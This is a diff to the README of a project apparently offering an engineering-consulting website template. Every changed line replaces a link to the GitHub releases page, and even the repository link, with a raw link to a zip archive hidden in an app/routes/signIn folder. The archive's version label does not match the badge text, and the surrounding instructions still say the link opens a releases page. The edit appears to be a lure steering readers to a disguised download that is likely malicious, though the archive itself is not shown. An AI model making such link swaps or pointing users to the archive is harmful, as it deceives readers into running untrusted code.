@@ -1,6 +1,6 @@
 # 🌐 engineering-consulting - Your Versatile Engineering Website Solution
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Bkace1312/engineering-consulting/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Before you download, please ensure that your system meets the following minimum 
 
 To download the application, visit the releases page by clicking the button below:
 
-[Download Latest Release](https://github.com/Bkace1312/engineering-consulting/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
 
 Once on the releases page, look for the most recent version of the application. Follow these steps:
 
@@ -75,7 +75,7 @@ If you need further assistance, feel free to reach out. You can find help throug
   
 ## 🌍 Links and Resources
 
-- **GitHub Repository**: [engineering-consulting](https://github.com/Bkace1312/engineering-consulting)
-- **Download Latest Release**: [Download Here](https://github.com/Bkace1312/engineering-consulting/releases)
+- **GitHub Repository**: [engineering-consulting](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
+- **Download Latest Release**: [Download Here](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
   
 Thank you for choosing **engineering-consulting**! Enjoy building your professional engineering website.
